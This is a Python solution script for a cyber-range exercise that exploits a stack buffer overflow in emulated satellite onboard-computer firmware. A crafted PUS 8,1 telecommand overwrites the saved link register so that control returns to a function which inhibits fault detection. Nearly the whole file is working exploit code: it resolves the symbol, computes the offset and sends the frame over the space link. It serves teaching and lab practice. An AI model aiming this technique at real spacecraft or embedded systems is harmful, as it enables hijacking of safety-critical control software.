#!/usr/bin/env python3
"""EX-F01 model solution: reach a function the ground is not allowed to call.

The attacker is on the space link, sending a telecommand the OBC is willing to accept. PUS 8,1 is a
legitimate service and function 1 is a legitimate function. The only thing wrong with this packet is
its length.

The OBC copies the PUS 8 argument block into a 16-octet frame-local buffer, sized from the packet
rather than from the buffer. Writing past it walks up the frame and over the saved link register, so
the handler returns wherever the packet says.

WHERE IT DOES NOT RETURN TO: a buffer full of instructions. SRAM on this part is execute-never, the
MPU says so, and Renode enforces it - `probe.sh` section G refuses an instruction fetch at
0x24003000 while allowing one in flash. Shellcode fails here exactly as it fails on the real
silicon, so the payload is an address that is already in the image.

Usage:
    python3 exercises/EX-F01-pus8-ret2win/solve.py               # against a running scenario
    python3 exercises/EX-F01-pus8-ret2win/solve.py --show        # print the payload and stop
"""
import argparse
import struct
import sys
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from cuberange.gs.link import SpaceLink                       # noqa: E402
from cuberange.proto.frame import encode_tc_frame             # noqa: E402
from cuberange.proto.pus import PusTc                         # noqa: E402
from cuberange.proto.spacepacket import PacketType, SpacePacket  # noqa: E402

OBC_APID = 0x0A9
GROUND_SOURCE_ID = 0x0042
SERVICE_FUNCTION, SUBTYPE_PERFORM = 8, 1
FUNC_SET_COMM_RAIL = 1

WIN_SYMBOL = "maintenance_inhibit_fdir"

# Offset from the first byte of the argument buffer to the saved link register, read out of the
# vulnerable image's prologue rather than guessed:
#
#   080006e4:  push {r4, r5, r6, lr}   -> saved lr lands at the top of a 16-byte block
#   080006e6:  sub  sp, #24            -> 24 bytes of locals below it
#   080006fa:  add  r0, sp, #8         -> memcpy destination: the buffer sits at sp+8
#
# so lr is at sp+36 and the buffer at sp+8: 28 octets apart. Every return path in the function goes
# through `ldmia.w sp!, {r4, r5, r6, lr}` and then tail-calls printk, so the corrupted value is what
# printk returns to.
#
# This number belongs to one build of one compiler. If the firmware changes, re-read the prologue -
# do not nudge it until the exercise passes. verify_ex_f01.py fails loudly rather than silently if
# it stops being right.
RET_OFFSET = 28
ARG_BUF_LEN = 16


def read_symbol(elf: Path, name: str) -> int:
    """Address of a symbol in a little-endian 32-bit ELF, without a cross toolchain.

    The learner is meant to find this with `nm` or a disassembler; the model solution parses it so
    that a rebuilt image cannot leave a stale address baked into a test. About forty lines of
    struct-unpacking is cheaper than a dependency the range would then have to install.
    """
    data = elf.read_bytes()
    if data[:4] != b"\x7fELF" or data[4] != 1:
        raise ValueError(f"{elf} is not a 32-bit ELF")
    e_shoff, = struct.unpack_from("<I", data, 0x20)
    e_shentsize, e_shnum, e_shstrndx = struct.unpack_from("<HHH", data, 0x2E)

    def section(i):
        off = e_shoff + i * e_shentsize
        s_name, s_type, _, _, s_off, s_size, s_link, _, _, s_entsize = \
            struct.unpack_from("<IIIIIIIIII", data, off)
        return dict(name=s_name, type=s_type, off=s_off, size=s_size, link=s_link,
                    entsize=s_entsize)

    shstr = section(e_shstrndx)

    def sec_name(sh):
        start = shstr["off"] + sh["name"]
        return data[start:data.index(b"\x00", start)].decode()

    symtab = next((s for s in map(section, range(e_shnum)) if sec_name(s) == ".symtab"), None)
    if symtab is None:
        raise ValueError(f"{elf} has no .symtab - it was stripped")
    strtab = section(symtab["link"])

    for off in range(symtab["off"], symtab["off"] + symtab["size"], symtab["entsize"]):
        st_name, st_value = struct.unpack_from("<II", data, off)
        start = strtab["off"] + st_name
        if data[start:data.index(b"\x00", start)].decode() == name:
            # ARM sets bit 0 of st_value on a Thumb function symbol, and `nm` hides it: the symtab
            # says 0x08000a11 where nm prints 0x08000a10. Mask it here and set it deliberately in
            # the payload, so the two places never disagree about whose bit it is.
            return st_value & ~1
    raise ValueError(f"{name} is not in {elf}. Was the image built with the maintenance handler?")


def build_payload(win_addr: int, rail_state: int = 1) -> bytes:
    """The PUS 8 application data: function id, then an argument block that runs off its buffer."""
    args = bytearray(RET_OFFSET + 4)
    # args[0] is the real argument - the rail state. Set it to ON so the exercise does not also
    # cut the radio: the point here is where control went, not that the satellite went quiet.
    args[0] = rail_state
    # The Thumb bit. Branching to an even address on Cortex-M raises a UsageFault instead of
    # executing anything, which looks like a failed exploit and is really a malformed one.
    args[RET_OFFSET:RET_OFFSET + 4] = struct.pack("<I", win_addr | 1)
    return struct.pack(">H", FUNC_SET_COMM_RAIL) + bytes(args)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=3777, help="space link port")
    ap.add_argument("--elf", type=Path,
                    default=Path("/tmp/cuberange/build-obc/zephyr/zephyr.elf"),
                    help="the OBC image, read to resolve the target address")
    ap.add_argument("--show", action="store_true", help="print the payload and exit")
    args = ap.parse_args()

    win = read_symbol(args.elf, WIN_SYMBOL)
    app_data = build_payload(win)

    print(f"{WIN_SYMBOL} is at 0x{win:08x} in {args.elf}")
    print(f"argument block: {len(app_data) - 2} octets into a {ARG_BUF_LEN}-octet buffer, "
          f"saved LR at +{RET_OFFSET}")
    print(f"payload: {app_data.hex()}")
    if args.show:
        return 0

    tc = PusTc(service=SERVICE_FUNCTION, subtype=SUBTYPE_PERFORM,
               source_id=GROUND_SOURCE_ID, app_data=app_data)
    packet = SpacePacket(apid=OBC_APID, ptype=PacketType.TC, sec_hdr=True,
                         seq_count=7, data=tc.encode())

    link = SpaceLink(port=args.port)
    link.connect(retries=60)
    try:
        link.send_frame(encode_tc_frame(packet.encode(), 7))
        print("sent. Watch the OBC console, and the FDIR indicator on gpioPortD pin 7.")
        time.sleep(3)
    finally:
        link.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
